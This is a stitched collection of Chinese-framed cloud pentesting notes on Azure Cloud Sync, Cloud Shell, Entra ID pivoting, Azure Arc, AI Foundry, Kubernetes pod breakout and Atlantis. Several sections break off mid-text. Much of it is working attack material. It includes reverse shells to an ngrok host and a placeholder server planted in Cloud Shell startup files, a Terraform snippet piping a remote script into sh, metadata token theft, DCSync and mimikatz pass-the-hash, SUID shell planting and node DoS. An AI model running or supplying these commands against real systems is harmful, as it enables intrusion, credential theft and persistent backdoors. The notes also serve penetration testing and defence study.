content: 来源路径： 02-知识点/云与容器/Az：Cloud Sync 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Az：Cloud Sync 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Az：Cloud Sync 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Az：Cloud Sync 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Az：Cloud Sync、Basic Information、Principals Generated、密码 Sychronization、Pivoting；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Az：Cloud Sync Basic Information Principals Generated 密码 Sychronization Pivoting AD --> Entra ID Entra ID --> AD 枚举 # 核心要点 Cloud Sync is basically the new way of Azure to synchronize the users from AD into Entra ID. 密码 哈希 synchronization can be enabled so users will be able to login into Entra ID using their passwords from AD. Moreover, whenever a 密码 is modified in AD, it'll be updated in Entra ID. Groups writeback: This feature allows group memberships from Entra ID to be synchronized back to the on-premises AD. This means that if a user is added to a group in Entra ID, they will also be added to the corresponding group in AD. Compromise the provAgentgMSA account, perform a DCSync attack, crack the 密码 of some user and then use it to login into Entra ID. Modify the 密码 of some user in the AD, wait until it's synced into Entra ID and then use it to login into Entra ID. To compromise the provAgentgMSA 凭据: # 命令 / 载荷 / 操作片段 # 1. AD --> Entra ID 12345678910111213141516171819# Enumerate provAgentgMSA accountGet-ADServiceAccount -Filter * -Server domain.local# Find who can read the password of the gMSA (usually only the DC computer account)Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties * -Server domain.local | selectPrincipalsAllowedToRetrieveManagedPassword# You need to perform a PTH with the hash of the DC computer account next. For example using mimikatz:lsadump::dcsync /domain:domain.local /user:<dc-name>$sekurlsa::pth /user:<dc-name>$ /domain:domain.local /ntlm:<hash> /run:"cmd.exe"# Or you can change who can read the password of the gMSA account to all domain admins for example:Set-ADServiceAccount -Identity 'pGMSA_<id>$' -PrincipalsAllowedToRetrieveManagedPassword 'Domain Admins'# Read the password of the gMSA$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'#Install-Module -Name DSInternals#Import-Module DSInternals$decodedpwd = ConvertFrom-ADManagedPasswordBlob $PasswordblobConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword # 2. 枚举 123456789# Check for the gMSA SAGet-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"# Get all the configured cloud sync agents (usually one per on-premise domain)## In the machine name of each you can infer the name of the domainaz rest \ --method GET \ --uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups" \ --headers "Content-Type=application/json" # 工具与参考入口 From the docs: escalate privileges even to global admin these permissions is needed DCSync check this current docs this blog post dnSpy # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Attackers can 利用 this by placing backdoors in the persistent home directory: Persistent Storage: Azure Cloud Shell’s home directory is mounted on an Azure file share and remains intact even after the session ends. Startup Scripts: Files like .bashrc or config/PowerShell/Microsoft.PowerShell profile.ps1 execute automatically at the start of each session, allowing for persistent execution when the cloud shell starts. This backdoor can execute commands even 5 minutes after the cloud shell is finished by the user. Additionally query Azure’s metadata service for instance details and tokens: 下载，backdoor and uplaod the image: Then, phish the user to access https://shell.azure.com/ # 命令 / 载荷 / 操作片段 # 1. Cloud Shell 持久化 1echo '(nohup /usr/bin/env /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc # 2. Cloud Shell 持久化 1curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s # 3. Cloud Shell Phishing 123456789101112131415161718192021222324252627# Download imagemkdir /tmp/phishing_imgaz storage file download-batch -d /tmp/phishing_img --account-name <acc-name> -s <file-share># Mount the imagemkdir /tmp/backdoor_imgsudo mount ./.cloudconsole/acc_carlos.img /tmp/backdoor_imgcd /tmp/backdoor_img# Create backdoormkdir .configmkdir .config/PowerShelltouch .config/PowerShell/Microsoft.PowerShell_profile.ps1chmod 777 .config/PowerShell/Microsoft.PowerShell_profile.ps1# Bash backdoorecho '(nohup /usr/bin/env /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/${SERVER}/${PORT} 0>&1 &)' >> .bashrc# PS backdoorecho '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19838);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> .config/PowerShell/Microsoft.PowerShell_profile.ps1# Unmountcd /tmpsudo umount /tmp/backdoor_img# Upload imageaz storage file upload --account-name <acc-name> --path ".cloudconsole/acc_username.img" --source "./tmp/phishing_img/.cloudconsole/acc_username.img" -s <file-share> # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

This technique is also commented in https://www.youtube.com/watch?v=AFay 58QubY**.** Cloud Kerberos Trust is configured in the hybrid environment (indicator: an AzureADKerberos$ RODC account exists in AD). The attacker has Global Admin (or Hybrid Identity Admin) rights in the Entra ID tenant (these roles can use the AD Connect synchronization API to modify Azure AD users). Obtain Azure AD sync API Access: Using the Global Admin account, acquire an access 令牌 for the Azure AD Provisioning (sync) API. This can be done with 工具 like ROADtools or AADInternals. For example, with ROADtools (roadtx): This outputs a .prt file containing the partial TGT and session key. If the account was cloud-only 密码，Azure AD still includes a TGT AD in the PRT response. # 命令 / 载荷 / 操作片段 # 1. Pivoting from Entra ID to On-Prem AD 12# Using roadtx to get an Azure AD Graph token (no MFA)roadtx gettokens -u <GlobalAdminUPN> -p <Password> --resource aadgraph # 2. Pivoting from Entra ID to On-Prem AD 1234# Example: modify a hybrid user to impersonate the MSOL accountpython3 modifyuser.py -u <GlobalAdminUPN> -p <Password>\ --sourceanchor <ImmutableID_of_User>\ --sid <TargetAD_SID> --sam <TargetAD_SAMName> # 3. Pivoting from Entra ID to On-Prem AD 1roadtx getprt -u <HybridUserUPN> -p <Password> -d <DeviceID_or_Cert> # 4. Pivoting from Entra ID to On-Prem AD 12# Use the partial TGT from the PRT file to get a full TGT and NTLM hashpython3 partialtofulltgt.py -p roadtx.prt -o full_tgt.ccache --extract-hash # 5. Pivoting from Entra ID to On-Prem AD 12# Using impacket's secretsdump to DCSync as the MSOL account (using NTLM hash)secretsdump.py 'AD_DOMAIN/<TargetSAM>$@<DC_IP>' -hashes :<NTLM_hash> LOCAL # 工具与参考入口 https://www.youtube.com/watch?v=AFay 58QubY Obtaining Domain Admin from Azure AD via Cloud Kerberos Trust # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Every resource in Azure has an Azure Resource ID that identifies it. The format of an Azure Resource ID is as follows: For a virtual machine named myVM in a resource group myResourceGroup under subscription ID 12345678-1234-1234-1234-123456789012, the Azure Resource ID looks like this: Read all users, Groups, Applications, Devices, Roles, Subscriptions, and their public properties Read non-hidden Group memberships Add up to 50 devices to Azure ( can be turned off ) Read other users: Default Yes (via Microsoft Graph) If you choose 密码 auth (by default), save the 密码 generated as you won't be able to access it again. If you choose certificate 认证，make sure the application will have access over the private key. User.Read：sign in and read user profile It isn’t another type of “application”, there isn’t any object in Azure that is an “Enterprise Application”, it’s just an abstraction to check the Service principals, App registrations and managed identities. To list all the VNets and subnets in an Azure account, you can use the Azure Command-Line Interface (CLI). Here are the steps: {｛#tab name="PowerShell" }} Azure Firewall is a managed, stateful firewall that filters traffic (L3–L7) for east-west and north-south flows. Deployed at the VNet level, it centralizes inspection for all subnets and auto-scales for availability. Azure Route Tables (UDR) let you override default routing by defining destination prefixes (e.g., 10.0.0.0/16 or 0.0.0.0/0) and a next hop (Virtual Network, Internet, Virtual Network Gateway, or Virtual Appliance). Private Link can be used with various Azure services, like Azure Storage, Azure SQL Database, and custom services shared via Private Link. It provides a secure way to consume services from within your own VNet or even from different Azure subscriptions. Discovery at scale (Azure Resource Graph): Traffic from your VNet to the Azure service travels over the Microsoft Azure backbone network, bypassing the public internet. The endpoint is a direct connection to the Azure service and does not provide a private IP for the service within the VNet. It's a one-to-one relationship between the subnet and the Azure service. Private Link maps Azure services into your VNet via a private endpoint, which is a network interface with a private IP address within your VNet. The Azure service is accessed using this private IP address, making it appear as if it's part of your network. It enables a secure connection to Azure services or your own services hosted in Azure, as well as a connection to services shared by others. VNet Peering can also used with a on-prem networks by setting up a site-to-site VPN or Azure ExpressRoute. # 命令 / 载荷 / 操作片段 # 1. 枚举 12345# List VNetsaz network vnet list --query "[].{name:name, location:location, addressSpace:addressSpace}"# List subnets of a VNetaz network vnet subnet list --resource-group <ResourceGroupName> --vnet-name <VNetName> --query "[].{name:name, addressPrefix:addressPrefix}" -o table # 2. 枚举 1234567# List VNetsGet-AzVirtualNetwork | Select-Object Name, Location, @{Name="AddressSpace"; Expression={$_.AddressSpace.AddressPrefixes}}# List subnets of a VNetGet-AzVirtualNetwork -ResourceGroupName <ResourceGroupName> -Name <VNetName> |Select-Object -ExpandProperty Subnets |Select-Object Name, AddressPrefix # 3. 枚举 123456789# List NSGsaz network nsg list --query "[].{name:name, location:location}" -o tableaz network nsg show --name <nsg-name># Get NSG rulesaz network nsg rule list --nsg-name <NSGName> --resource-group <ResourceGroupName> --query "[].{name:name, priority:priority, direction:direction, access:access, protocol:protocol, sourceAddressPrefix:sourceAddressPrefix, destinationAddressPrefix:destinationAddressPrefix, sourcePortRange:sourcePortRange, destinationPortRange:destinationPortRange}" -o table# Get NICs and subnets using this NSGaz network nsg show --name <NSGName> --resource-group <ResourceGroupName> --query "{subnets: subnets, networkInterfaces: networkInterfaces}" # 4. 枚举 123456789101112# List NSGsGet-AzNetworkSecurityGroup | Select-Object Name, LocationGet-AzNetworkSecurityGroup -Name <NSGName> -ResourceGroupName <ResourceGroupName># Get NSG rulesGet-AzNetworkSecurityGroup -Name <NSGName> -ResourceGroupName <ResourceGroupName> |Select-Object -ExpandProperty SecurityRules |Select-Object Name, Priority, Direction, Access, Protocol, SourceAddressPrefix, DestinationAddressPrefix, SourcePortRange, DestinationPortRange# Get NICs and subnets using this NSG(Get-AzNetworkSecur

Certificates: Used to store certificates that can be used in runbooks. A Runbook in Azure Automation is a script that performs tasks automatically within your cloud environment. Runbooks can be written in PowerShell, Python, or Graphical editors. They help automate administrative tasks like VM management, patching, or compliance checks. A job contains the output of the Runbook execution. If you can read the jobs, do it as they contain the output of the run (potential sensitive info). There are 3 main ways to execute a Runbook: Manual Trigger: You can manually trigger a Runbook from the Azure Portal and from the cli. Powershell 5.1 Powershell 7.1 PowerShell 7.2 Default 凭据: You don't need to provide the 凭据 and the runbooks will be executed inside the VMs as System. Specific 凭据: You need to provide the name of the 凭据 object inside the automation account, which will be used to execute the runbooks inside the VMs. Therefore, in this case, it could be possible to Copies the EnableAzureArc.ps1 onboarding script to the designated network share created for the onboarding process, which also contains the Windows installer package. We have discovered a network share containing the AzureArcDeploy directory. There are several methods to obtain a machine account within an AD environment. One of the most common is exploiting the machine account quota. Another method involves compromising a machine account through vulnerable ACLs or various other misconfigurations. Once a machine account is obtained, it is possible to authenticate using this account. We can either use the runas.exe command with the netonly flag or use pass-the-ticket with Rubeus.exe. # 命令 / 载荷 / 操作片段 # 1. Identifying the Issues 123456# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups$DomainComputersSID = "SID=" + $DomainComputersSID$DomainControllersSID = "SID=" + $DomainControllersSID$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "Import-Module $PSScriptRoot\AzureArcDeployment.psm1$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret) # 2. 利用 12Import-MKodule powermadNew-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose # 3. 利用 1runas /user:fake01$ /netonly powershell # 4. 利用 1.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr # 5. 利用 123456Import-Module .\AzureArcDeployment.psm1$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)$ebs # 工具与参考入口 SecretManagement.DpapiNG https://xybytes.com/azure/Abusing-Azure-Arc/ # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

After a single sign-on to Azure AD, users can access both cloud and on-premises applications through an external URL or an internal application portal. After the user has accessed the application through an endpoint, the user is directed to the Azure AD sign-in page. After a successful sign-in, Azure AD sends a 令牌 to the user's client device. The client sends the 令牌 to the Application Proxy service, which retrieves the user principal name (UPN) and security principal name (SPN) from the 令牌. Application Proxy then sends the request to the Application Proxy connector. # 命令 / 载荷 / 操作片段 # 1. 枚举 123456789# Enumerate applications with application proxy configuredGet-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}# Get applications service principalGet-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Name"}# Use the following ps1 script from https://learn.microsoft.com/en-us/azure/active-directory/app-proxy/scripts/powershell-display-users-group-of-app# to find users and groups assigned to the application. It supports multiple programming languages and integrates with various Azure 工具 and services for enhanced functionality and management. Note that none of those isolations prevents other common web vulnerabilities (such as file 上传，or injections). And if a management identity is used, it could be able to escalate privileges to them. Web App + Database: The web console allows to create an App with a database. In this case it's possible to select the database to use (SQLAzure, PostgreSQL, MySQL, MongoDB) and it also allows you to create an Azure Cache for Redis. The URL containing the 凭据 for the database and Redis will be stored in the appsettings. 容器: It's possible to deploy a 容器 to the App Service by indicating the URL of the 容器 and the 凭据 to access it. Mounts: It's possible to create 5 mounts from Storage accounts being these Azure Blob (Read-Only) or Azure Files. The configuration will store the access key over the Storage Account. /DebugConsole: A console that allows you to execute commands in the environment where Kudu is running. Note that this environment doesn't have access to the metadata service to get tokens. This environment has access to the metadata service in order to obtain tokens from the assigned managed identities. /wwwroot/: The root directory of the web app. You can 下载 all the files from here. You can get the 认证 tokens running az rest --url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01" Azure by default will setup a Github Action to deploy the code to the App Service every time the code is updated. It's also possible to indicate a remote git repository (with username and 密码) to get the code from there. It's also possible to use an Azure Repository. # 命令 / 载荷 / 操作片段 # 1. 枚举 Multi-tenant connectors (Hugging Face, Azure Data Lake, Event Hubs) that may leak upstream 凭据 or tokens. AI Registries & Model Catalog: Allow region-scoped sharing of models, environments, components, data, and evaluation results. Registries can automatically sync to GitHub/Azure DevOps, meaning PATs may be embedded inside connection definitions. Azure OpenAI (Microsoft.CognitiveServices/accounts with kind=OpenAI): Provides GPT family models. Access is controlled via role assignments + admin/query keys. Many Foundry prompt flows keep the generated keys as secrets or environment variables accessible from compute jobs. Azure AI Search (Microsoft.Search/searchServices): Vector/index storage typically connected via a Search admin key stored inside a project connection. Index data can hold sensitive embeddings, retrieved documents, or raw training corpora. AI hubs/projects can enable system-assigned or user-assigned identities. These identities usually hold roles on storage accounts, key vaults, 容器 registries, Azure OpenAI resources, Azure AI Search services, Event Hubs, Cosmos DB, or custom APIs. Prompt Flow connections and Automated Agents can request tokens via DefaultAzureCredential; capturing the metadata endpoint from compute gives tokens for 横向移动. Hubs/projects support publicNetworkAccess, private endpoints, Managed VNet and managedOutbound rules. Misconfigured allowInternetOutbound` or open scoring endpoints permit direct exfiltration. Azure OpenAI and AI Search support firewall rules, Private Endpoint Connections (PEC), shared private link resources, and trustedClientCertificates. When public access is enabled these services accept requests with any source IP that knows the key. Default hub/project deployments create a storage account, Azure 容器 Registry, Key Vault, Application Insights, and Log Analytics workspace inside a hidden managed resource group (pattern: mlw-<workspace>-rg). Workspace datastores reference blob/data lake containers and can embed SAS tokens, service principal secrets, or storage access keys. Workspace connections (for Azure OpenAI, AI Search, Cognitive Services, Git, Hugging Face, etc.) keep 凭据 in the workspace Key Vault and surface them through the management plane when listing the connection (values are base64-encoded JSON). AI Search admin keys provide full read/write access to indexes, skillsets, data sources, and can retrieve documents that feed RAG systems. AI Foundry supports GitHub/Azure DevOps integration for code and prompt flow assets. OAuth tokens or PATs live in the Key Vault + connection metadata. # 命令 / 载荷 / 操作片段 # 1. 枚举 with az 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# Install the Azure ML / AI CLI extension (if missing)az extension add --name ml# Enumerate AI Hubs (workspaces with kind=hub) and inspect propertiesaz ml workspace list --filtered-kinds hub --resource-group <RG> --query "[].{name:name, location:location, rg:resourceGroup}" -o tableaz resource show --name <HUB> --resource-group <RG> \ --resource-type Microsoft.MachineLearningServices/workspaces \ --query "{location:location, publicNetworkAccess:properties.publicNetworkAccess, identity:identity, managedResourceGroup:properties.managedResourceGroup}" -o jsonc# Enumerate AI Projects (kind=project) under a hub or RGaz resource list --resource-type Microsoft.MachineLearningServices/workspaces --query "[].{name:name, rg:resourceGroup, location:location}" -o tableaz ml workspace list --filtered-kinds project --resource-group <RG> \ --query "[?contains(properties.hubArmId, '/works

There are three main options: Create an endpoint that explicitly uses the UAMI and deploy a malicious scoring script to steal its 令牌. See the fattack requiring onlineEndpoints/write and deployments/write. Create a command job that runs arbitrary code and exfiltrates the UAMI 令牌. See the jobs/write attack section below for details. Create a compute instance with a setup script that runs at boot time. The script can steal tokens and establish 持久化. See the computes/write attack section below for details. Pipelines and catalogs that pull by name only (no commit pinning/integrity) will resolve to attacker-controlled repos. When Azure deploys the model, loader code can execute in the endpoint environment, granting RCE with that endpoint’s permissions. Ownership transfer: Old path 307 to the new author while old author exists. If the old author is later deleted and re-registered, the redirect breaks and the attacker’s repo serves at the legacy path. Publish a malicious repo with loader code that executes on import or requires trust remote code=True. Deploy the legacy Author/ModelName from Azure AI Foundry. The platform pulls the attacker repo; loader executes inside the Azure endpoint 容器 / VM, yielding RCE with endpoint permissions. Example 载荷 fragment executed on import (for demonstration only): Access usually matches the endpoint’s managed identity/service principal permissions. Treat it as an initial access foothold for data access and 横向移动 within Azure. Enumerate environment variables and MSI endpoints for tokens: Check mounted storage, model artifacts, and reachable Azure services with the acquired 令牌. Consider 持久化 by leaving poisoned model artifacts if the platform re-pulls from HF. Continuously scan codebases and defaults/docstrings/notebooks for hard-coded Author/ModelName that are deleted/transferred; update or pin. Transferred model: legacy path 307 to new author while old author exists; if old author later deleted and re-registered, legacy path serves attacker content. # 命令 / 载荷 / 操作片段 # 1. Identifying Reusable Namespaces (HF) 123456# Check author/org existencecurl -I https://huggingface.co/<Author> # 200 exists, 404 deleted/available# Check model pathcurl -I https://huggingface.co/<Author>/<ModelName># 307 -> redirect (transfer case), 404 -> deleted until takeover # 2. Defensive Guidance for Azure AI Foundry Users 12from transformers import AutoModelm = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>") # 5. Recognition Heuristics (HTTP) 1curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location" # 工具与参考入口 Hugging Face: Renaming or transferring a repo # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 云身份与权限 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

When exchanging with Azure, explicitly set audience=api://AzureADTokenExchange. To force Azure audience on 令牌 request: Create App Registration (service principal) and grant least privilege (e.g., Storage Blob Data Contributor on a specific storage account). Issuer: https:// 令牌.actions.githubusercontent.com Audience: api://AzureADTokenExchange Risk: If the branch/tag is unprotected, any contributor can push and obtain tokens. Risk: Unprotected environments (no reviewers) allow contributors to mint tokens. Linux/macOS: ~/.azure/msal 令牌 cache.json holds MSAL tokens for az CLI sessions Windows: msal 令牌 cache.bin under user profile; DPAPI‑protected Read arbitrary files via functions like file() Execute commands via the external data source # 命令 / 载荷 / 操作片段 # 1. title: Attacking Kubernetes from inside a Pod 技术笔记
content: 来源路径： 02-知识点/云与容器/Attacking Kubernetes from inside a Pod 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Attacking Kubernetes from inside a Pod 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Attacking Kubernetes from inside a Pod 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Attacking Kubernetes from inside a Pod 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Attacking Kubernetes from inside a Pod、Pod Breakout、Escaping from the pod、Abusing writable hostPath/bind mounts (容器 -> host root via SUID planting)、Abusing Kubernetes Privileges；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 22 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Attacking Kubernetes from inside a Pod Pod Breakout Escaping from the pod Abusing writable hostPath/bind mounts (容器 -> host root via SUID planting) Abusing Kubernetes Privileges Abusing Cloud Privileges Search vulnerable network services Services Scanning Sniffing Network Spoofing Node DoS Node Post - 利用 Find node kubeconfig Steal Secrets Privileged DaemonSets Pivot to Cloud Steal etcd # 核心要点 In order to try to escape from the pods you might need to escalate privileges first, some techniques to do it: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html You can check this Docker breakouts to try to escape from a pod you have compromised: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/Docker-security/Docker-breakout-privilege-escalation/index.html The mounted volume is writable from inside the 容器 (readOnly: false and filesystem permissions allow write). You have some way to execute the planted binary on the host (for example, separate SSH/RCE on host, a user on the host can execute it, or another vector that runs binaries from that path). This technique also works with plain Docker bind mounts; in Kubernetes it’s typically a hostPath volume (readOnly: false) or an incorrectly scoped subPath. For this purpose, you can try to get all the services of the Kubernetes environment: The 容器 Runtime process (Docker) More pods/containers running in the node you can abuse like this one (more tokens) /etc/Kubernetes/kubelet-kubeconfig /etc/Kubernetes/admin.conf --> kubectl --kubeconfig /etc/Kubernetes/admin.conf get all -n kube-system Other Kubernetes common files: /etc/Kubernetes/kubelet.conf- Regular Config # 命令 / 载荷 / 操作片段 # 1. Abusing writable hostPath/bind mounts (容器 -> host root via SUID planting) 123456789# Inside the compromised containermount | column -tcat /proc/self/mountinfo | grep -E 'host-path|kubernetes.io~host-path' || truefindmnt -T / 2>/dev/null | sed -n '1,200p'# Test if a specific mount path is writableTEST_DIR=/var/www/html/some-mount # replace with your suspected mount path[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"# Quick practical testprintf "ping\n" > "$TEST_DIR/.w" # 2. Abusing writable hostPath/bind mounts (容器 -> host root via SUID planting) 123456# As root inside the container, copy a static shell (or /bin/bash) into the mounted path and set SUID/SGIDMOUNT="/var/www/html/survey" # path inside the container that maps to a host directorycp /bin/bash "$MOUNT/suidbash"chmod 6777 "$MOUNT/suidbash"ls -l "$MOUNT/suidbash"# -rwsrwsrwx 1 root root 1234376 ... /var/www/html/survey/suidbash # 3. Abusing writable hostPath/bind mounts (容器 -> host root via SUID planting) 1234# On the host, locate the mapped path (e.g., from the Pod spec .spec.volumes[].hostPath.path or by prior enumeration)# Example host path: /opt/limesurvey/suidbashls -l /opt/limesurvey/suidbash/opt/limesurvey/suidbash -p # -p preserves effective UID 0 in bash # 4. Services 1kubectl get svc --all-namespaces # 5. Scanning 12345678910111213141516sudo apt-get updatesudo apt-get install nmapnmap-kube (){ nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"}nmap-kube-discover () { local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,'); local SERVER_RANGES=" "; SERVER_RANGES+="10.0.0.1 "; SERVER_RANGES+="10.0.1.* "; SERVER_RANGES+="10.*.0-1.* "; nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"}nmap-kube-discover # 6. Node DoS 1stress-ng --vm 2 --vm-bytes 2G --timeout 30s # 7. Node DoS 1kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx # 8. Find node kubeconfig 12ps -ef | grep kubeletroot 1406 1 9 11:55 ? 00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubele

content: 来源路径： 02-知识点/云与容器/Atlantis Security 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Atlantis Security 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Atlantis Security 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Atlantis Security 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Atlantis Security、Basic Information、Local Lab、Atlantis Access、Git Server 凭据；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Atlantis Security Basic Information Local Lab Atlantis Access Git Server 凭据 Webhooks Provider 凭据 <a href="#provider - 凭据" id="provider - 凭据"></a> Web Page Server Configuration Repos Configuration Atlantis Commands Attacks Atlantis plan RCE：Config modification in new PR Atlantis plan Secrets Dump Atlantis apply RCE：Config modification in new PR Terraform Param Injection Custom Workflow 绕过 plan/apply protections # 核心要点 Go to the atlantis releases page in https://github.com/runatlantis/atlantis/releases and 下载 the one that suits you. Create a personal 令牌 (with repo access) of your github user Execute ./atlantis testdrive and it will create a demo repo you can use to talk to atlantis Atlantis support several git hosts such as Github, Gitlab, Bitbucket and Azure DevOps.\ However, in order to access the repos in those platforms and perform actions, it needs to have some privileged access granted to them (at least write permissions).\ In any case, from an attackers perspective, the Atlantis account is going to be one very interesting to compromise. The Atlantis Helm Chart and AWS Fargate Module have their own mechanisms for provider 凭据. Read their docs. AWS EC2 Roles (Search for "EC2 Role") Many users set environment variables, ex. AWS ACCESS KEY, where Atlantis is running. Others create the necessary config files, ex. ~/.aws/ 凭据，where Atlantis is running. Use the HashiCorp Vault Provider to obtain provider 凭据. Stealthier Attack Instead of adding the rev shell directly into the terraform file, you can load an external resource that contains the rev shell: In the external resource, use the ref feature to hide the terraform rev shell code in a branch inside of the repo, something like: git@github.com:carlospolop/terraform external module rev shell//modules?ref=b401d2b # 命令 / 载荷 / 操作片段 # 1. Atlantis Commands 1234567891011121314151617181920# Get helpatlantis help# Run terraform planatlantis plan [options] -- [terraform plan flags]##Options:## -d directory## -p project## --verbose## You can also add extra terraform options# Run terraform applyatlantis apply [options] -- [terraform apply flags]##Options:## -d directory## -p project## -w workspace## --auto-merge-disabled## --verbose## You can also add extra terraform options # 2. Attacks 12atlantis unlock #You might need to run this in a different PRatlantis plan -- -lock=false # 3. Atlantis plan RCE：Config modification in new PR 123data "external" "example" { program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]} # 4. Atlantis plan RCE：Config modification in new PR 123module "not_rev_shell" { source = 